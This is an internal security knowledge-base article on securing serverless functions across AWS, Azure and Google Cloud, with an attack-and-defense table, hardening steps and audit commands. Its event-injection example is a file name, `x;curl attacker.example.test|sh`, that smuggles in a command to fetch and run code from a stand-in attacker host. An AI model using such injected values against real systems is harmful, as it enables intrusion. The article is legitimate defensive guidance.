# Serverless Security (Functions as a Service)

## What
Securing code that runs on a provider-managed function platform: AWS Lambda, Azure Functions, Google Cloud Run functions (formerly Cloud Functions) and similar. The provider patches and isolates the host, OS and runtime. The customer owns the function code and its dependencies, the execution identity and its permissions, the triggers (HTTP endpoints, queues, storage events, schedules), environment configuration and secrets, network access, and logging. General cloud controls are in `kb/04-cloud-infra/cloud-security.md`; per-provider IAM baselines are in `kb/04-cloud-infra/cloud-provider-baselines.md`.

## Why it matters
- Each function is a small, internet-reachable or event-reachable entry point with its own cloud identity. One over-privileged function role turns a code bug into account-level access.
- Functions receive input from many sources besides HTTP (object names, queue messages, database streams, email, IoT events). Teams often validate only the HTTP path.
- The function's temporary cloud credentials are available inside the runtime (on Lambda as the `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` and `AWS_SESSION_TOKEN` environment variables). Code injection, SSRF to a local identity endpoint or a dependency that reads the environment can steal them.
- Scaling is automatic, so an abused function can run up cost ("denial of wallet") or exhaust a downstream database rather than simply going down.
- There is no host to put an agent on, so detection relies on platform logs and the function's own logging.

## Attacks
*For authorized testing only. Each pattern lists its main defense.*

| Attack | Example | Defense |
|---|---|---|
| Event-data injection | An uploaded object named `x;curl attacker.example.test|sh` reaches a shell call; a queue message is passed to SQL or `eval` | Treat every trigger payload as untrusted; parameterized queries; no shell; schema validation per event source |
| Over-privileged execution role | One shared role with `s3:*` or `Editor` used by every function; a bug in one function reads all buckets | One role or service account per function, scoped to named resources and actions |
| Credential theft from the runtime | RCE or a malicious dependency reads the environment or the local identity endpoint and exfiltrates temporary credentials | Least-privilege role, egress restrictions, alerts on credential use from outside the provider network, dependency scanning |
| Unauthenticated endpoints | Lambda function URL with `AuthType: NONE` and a public resource policy; Azure Functions `anonymous` HTTP trigger; Cloud Run service allowing `allUsers` | Require IAM or an authorizer (API gateway, Entra ID / Easy Auth, IAP); review resource policies |
| Secrets in configuration | Database password in plain environment variables, readable by anyone with `lambda:GetFunctionConfiguration` or app-settings read access, and copied into IaC state | Secrets manager or Key Vault reference fetched at runtime by the function identity |
| Vulnerable or malicious dependencies | Outdated package or layer bundled into the deployment artifact | SCA in CI, pinned versions, signed artifacts, minimal packages (`kb/06-secure-sdlc/secure-sdlc-and-supply-chain.md`) |
| Tampered deployment | Attacker with deploy rights replaces the code or adds a layer | Code signing (AWS Lambda code signing with AWS Signer), deploys only from CI with OIDC federation, alerts on out-of-band updates |
| Denial of wallet / downstream exhaustion | Flood of requests or events scales the function to its concurrency limit | Reserved / maximum concurrency, timeouts, API gateway throttling, budgets and cost alerts |
| State leakage between invocations | Data cached in global variables or `/tmp` of a reused execution environment is served to the next caller | No per-user data in globals or `/tmp`; clear after use |

## Defenses

### 1. Identity and permissions
- One execution role (AWS), managed identity (Azure) or user-managed service account (Google Cloud) per function. On Google Cloud, do not run functions as the default compute service account, which projects have historically granted the broad Editor role.
- Scope policies to named resources and specific actions; generate them from observed activity (IAM Access Analyzer policy generation on AWS) and remove unused permissions.
- Restrict who can update function code and configuration (`lambda:UpdateFunctionCode`, `lambda:UpdateFunctionConfiguration`, `iam:PassRole`) to the CI deploy role.

### 2. Triggers and input
- Authenticate every HTTP trigger: Lambda function URLs with `AuthType: AWS_IAM` or an API Gateway authorizer (JWT/Cognito/Lambda authorizer); Azure Functions behind App Service Authentication or API Management (function keys are shared secrets, not user authentication); Cloud Run functions with IAM invoker checks or IAP.
- Validate every event payload against a schema; enforce size limits. Apply the same output encoding and injection defenses as any web app (`kb/03-application/owasp-top10.md`, `kb/03-application/api-security.md`).
- Restrict resource-based policies so only the expected source can invoke the function (for AWS, `aws:SourceArn` / `aws:SourceAccount` conditions on service principals).

### 3. Secrets and configuration
- Store secrets in AWS Secrets Manager / SSM Parameter Store SecureString, Azure Key Vault (Key Vault references) or Google Secret Manager; fetch with the function identity and cache in memory with a short TTL (`kb/05-identity-crypto/secrets-management.md`).
- Encrypt environment variables with a customer-managed key where supported and limit who can read function configuration.

### 4. Code and supply chain
- Build artifacts in CI from pinned dependencies, scan them (SCA, SAST), and deploy only signed artifacts. On AWS, a code signing configuration set to `Enforce` rejects unsigned or untrusted code.
- Keep runtimes on supported versions; providers deprecate old runtimes and stop patching them.

### 5. Network and resource limits
- Attach functions to a private network (VPC / VNet integration / VPC connector) only when they need private resources, and then restrict egress through a NAT with allowlists or private endpoints.
- Set timeouts, memory and concurrency limits per function; configure dead-letter queues or failure destinations so poisoned messages do not retry forever.

### 6. Logging and detection
- Enable platform audit logs for control-plane changes (CloudTrail management events, Azure Activity Log, Cloud Audit Logs) and, for sensitive functions, invocation data events (CloudTrail Lambda data events).
- Log structured security events from the function itself (authN failures, validation failures), without secrets or tokens (`kb/06-secure-sdlc/security-logging-and-monitoring.md`).
- Alert on: function code or configuration changed outside CI, new public function URLs or invoker bindings, role policy changes, function credentials used from outside the provider, error or throttle spikes.

## How to verify
- Public or unauthenticated functions (AWS): for each function, `aws lambda list-function-url-configs --function-name <FN>` must not show `"AuthType": "NONE"` unless intended and documented; `aws lambda get-policy --function-name <FN>` must not allow `"Principal": "*"` without restricting conditions.
- Secrets in environment: `aws lambda get-function-configuration --function-name <FN> --query Environment` and `az functionapp config appsettings list -n <APP> -g <RG>` show no credentials, only references.
- Identity per function (Google Cloud): `gcloud functions describe <FN> --region <REGION> --format='value(serviceConfig.serviceAccountEmail)'` is a dedicated account, not `<PROJECT_NUMBER>-compute@developer.gserviceaccount.com`.
- Least privilege: IAM Access Analyzer unused-access findings or provider recommender output show no unused high-risk permissions on function roles.
- Concurrency and timeouts are set on every production function (`aws lambda get-function-concurrency --function-name <FN>`).
- Posture scanning: Prowler or the provider's posture tool reports no failed serverless checks of high severity.
- Detection test: in a test account, update a function's code outside CI and confirm the alert fires.

## References
- OWASP Serverless Top 10 (2018 interpretation of the OWASP Top 10 2017 for serverless): https://owasp.org/www-project-serverless-top-10/
- AWS Lambda Developer Guide, Security in AWS Lambda: https://docs.aws.amazon.com/lambda/latest/dg/lambda-security.html
- AWS Lambda, Control access to Lambda function URLs: https://docs.aws.amazon.com/lambda/latest/dg/urls-auth.html
- AWS Lambda, Code signing: https://docs.aws.amazon.com/lambda/latest/dg/configuration-codesigning.html
- AWS Lambda, Working with Lambda environment variables (includes defined runtime environment variables): https://docs.aws.amazon.com/lambda/latest/dg/configuration-envvars.html
- Microsoft Learn, Securing Azure Functions: https://learn.microsoft.com/en-us/azure/azure-functions/security-concepts
- Google Cloud, Cloud Run functions security overview: https://docs.cloud.google.com/functions/docs/securing/overview
- NIST SP 800-204 (Security Strategies for Microservices-based Application Systems)
- MITRE ATT&CK T1648 (Serverless Execution), T1552.005 (Unsecured Credentials: Cloud Instance Metadata API), T1078.004 (Cloud Accounts)
- See also `kb/04-cloud-infra/cloud-security.md`, `kb/04-cloud-infra/cloud-provider-baselines.md`, `kb/05-identity-crypto/secrets-management.md`, `kb/06-secure-sdlc/cicd-security.md`
